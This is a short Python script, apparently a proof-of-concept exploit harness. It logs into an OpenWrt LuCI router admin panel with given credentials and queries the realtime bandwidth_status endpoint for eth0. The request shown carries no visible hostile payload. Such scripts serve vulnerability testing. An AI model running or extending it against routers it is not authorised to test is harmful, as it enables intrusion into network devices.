#!/usr/bin/python3

import argparse
import json
import requests
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def exploit(args):

        address = args.address
        username = args.username
        password = args.password
    
        session = requests.Session()
        url = 'http://%s/cgi-bin/luci/' % address
        data = {'luci_username':username,'luci_password':password}
        response = session.post(url=url,data=data,verify=False)
        print(response)
        auth = response.request.headers['Cookie'].split('=')

        cookies = {auth[0]:auth[1]}
        url = 'http://%s/cgi-bin/luci/admin/status/realtime/bandwidth_status/eth0' % ( address )
        print(url)
        response = session.get(url=url,cookies=cookies,verify=False)
        print('[+] out='+str(response.content))
        if response.status_code == 200:
            print("success")
        else:
            print("Fail")



def main():
    parser = argparse.ArgumentParser(description='bandwidth_status.py')
    requiredNamed = parser.add_argument_group('required named arguments')
    requiredNamed.add_argument('-a', '--address', help='Luci host address', required=True)
    requiredNamed.add_argument('-u', '--username', help='Luci username', required=True)
    requiredNamed.add_argument('-p', '--password', help='Luci password', required=True)
    args = parser.parse_args()
    exploit(args)

if __name__== "__main__":
    main()
